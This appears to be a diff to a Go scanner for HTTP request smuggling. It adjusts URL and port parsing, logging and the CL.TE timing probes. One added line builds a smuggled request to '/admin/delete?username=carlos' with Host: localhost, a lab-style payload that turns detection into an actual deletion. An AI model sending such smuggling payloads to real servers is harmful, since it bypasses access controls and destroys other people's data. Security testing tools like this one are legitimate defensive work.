@@ -48,17 +48,26 @@ func (d *DesyncerImpl) ParseURL(uri string) error {
 		return err
 	}
 	d.URL = u
-	if d.URL.Scheme == "" && d.URL.Port() == "" {
+	if len(d.URL.Scheme) == 0 && len(d.URL.Port()) == 0 {
 		return errors.New("invalid URL: Empty Scheme & Port")
 	}
-	if d.URL.Scheme != "https" && d.URL.Scheme != "http" {
+	if len(d.URL.Scheme) > 0 && d.URL.Scheme != "https" && d.URL.Scheme != "http" {
 		return fmt.Errorf("unsupported scheme: %s: valid schemes: http,https", d.URL.Scheme)
 	}
-	if d.URL.Port() == "" {
-		if d.URL.Scheme == "http" {
-			d.URL.Host = d.URL.Host + ":80"
-		} else if d.URL.Scheme == "https" {
-			d.URL.Host = d.URL.Host + ":443"
+	if len(d.URL.Port()) > 0 {
+		portInt, err := strconv.Atoi(d.URL.Port())
+		if err != nil {
+			return fmt.Errorf("%v: error parsing port number", err)
+		}
+		if portInt >= (1 << 16) {
+			return errors.New("invalid port: port must be in range [1-65535]")
+		}
+	}
+	if len(d.URL.Scheme) == 0 {
+		if d.URL.Port() == "443" {
+			d.URL.Scheme = "https"
+		} else {
+			d.URL.Scheme = "http"
 		}
 	}
 
@@ -80,7 +89,7 @@ func (d *DesyncerImpl) NewPl(pl string) *Payload {
 	headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"
 	headers["Connection"] = "close"
 	headers["Content-Type"] = "application/x-www-form-urlencoded"
-	headers["Host"] = d.URL.Host
+	headers["Host"] = d.URL.Host // this is causing a big issue // set it to just host if port is 80/443 else host:port
 
 	payload.Header = headers
 	for k, v := range d.Hdr {
@@ -200,7 +209,7 @@ func (d *DesyncerImpl) runCLTECL() bool {
 func (d *DesyncerImpl) test(p *Payload) (int, error) {
 	t := Transport{}
 	q := d.URL.Query()
-	q.Set("t", fmt.Sprintf("%d", time.Now().Unix())) // avoid caching
+	q.Set("t", fmt.Sprintf("%d", rand.Int32N(math.MaxInt32))) // avoid caching
 	d.URL.RawQuery = q.Encode()
 	start := time.Now()
 	resp, err := t.RoundTrip(&Request{Url: d.URL, Payload: p, Timeout: config.Glob.Timeout})
@@ -239,8 +248,7 @@ func (d *DesyncerImpl) testTECL(p *Payload) bool {
 				log.Debug().
 					Str("endpoint", d.URL.String()).
 					Str("payload", p.HdrPl).
-					Err(err).
-					Msg("")
+					Err(err).Msg("")
 			} else if ret == 2 {
 				log.Debug().
 					Str("endpoint", d.URL.String()).
@@ -294,28 +302,37 @@ func (d *DesyncerImpl) testCLTE(p *Payload) bool {
 		ret, err := d.test(p)
 		if ret != 1 {
 			if ret == -1 {
-				log.Debug().Str("endpoint", d.URL.String()).Str("payload", p.HdrPl).Err(err).Msg("")
+				log.Debug().
+					Str("endpoint", d.URL.String()).
+					Str("payload", p.HdrPl).Err(err).Msg("")
 			} else if ret == 2 {
-				log.Debug().Str("endpoint", d.URL.String()).Msg("disconnected before timeout")
+				log.Debug().
+					Str("endpoint", d.URL.String()).
+					Msg("disconnected before timeout")
 			}
 			return false
 		}
 		diff := time.Since(start)
 		p.Cl = 11
+		p.Body = "1\r\nG\r\n0\r\n\r\n"
 		ret2, err := d.test(p)
 		if ret2 == -1 {
-			log.Debug().Str("endpoint", d.URL.String()).Err(err).Msg("")
+			log.Debug().
+				Str("endpoint", d.URL.String()).Err(err).Msg("")
 			return false
 		}
 		p.Cl = 4
+		p.Body = "1\r\n0"
 		if ret2 == 0 {
 			ctr++
 			if ctr < 3 {
 				continue
 			}
-			log.Info().Str("endpoint", d.URL.String()).Msgf("Potential CLTE issue found - %s@%s://%s%s",
-				config.Glob.Method, d.URL.Scheme, d.URL.Host, d.URL.Path)
-			inner := fmt.Sprintf("GET /404 HTTP/1.1\r\nHost: %s\r\nContent-Length: 50\r\n\r\n", d.URL.Hostname())
+			log.Info().
+				Str("endpoint", d.URL.String()).
+				Msgf("Potential CLTE issue found - %s@%s://%s%s", config.Glob.Method,
+					d.URL.Scheme, d.URL.Host, d.URL.Path)
+			inner := "GET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\nContent-Length: 50\r\n\r\n" // host would be taken from a url given by the user
 			tmp := fmt.Sprintf("1\r\nA\r\n0\r\n\r\n%s", inner)
 			p.Body = tmp
 			p.Cl = len(p.Body)
@@ -324,7 +341,10 @@ func (d *DesyncerImpl) testCLTE(p *Payload) bool {
 			d.GenReport(p, diff)
 			return true
 		}
-		log.Debug().Str("endpoint", d.URL.String()).Err(err).Msg("CLTE timeout on both length 4 and 11")
+		log.Debug().
+			Str("endpoint", d.URL.String()).
+			Str("payload", p.HdrPl).
+			Err(err).Msg("CLTE timeout on both length 4 and 11")
 		return false
 	}
 }
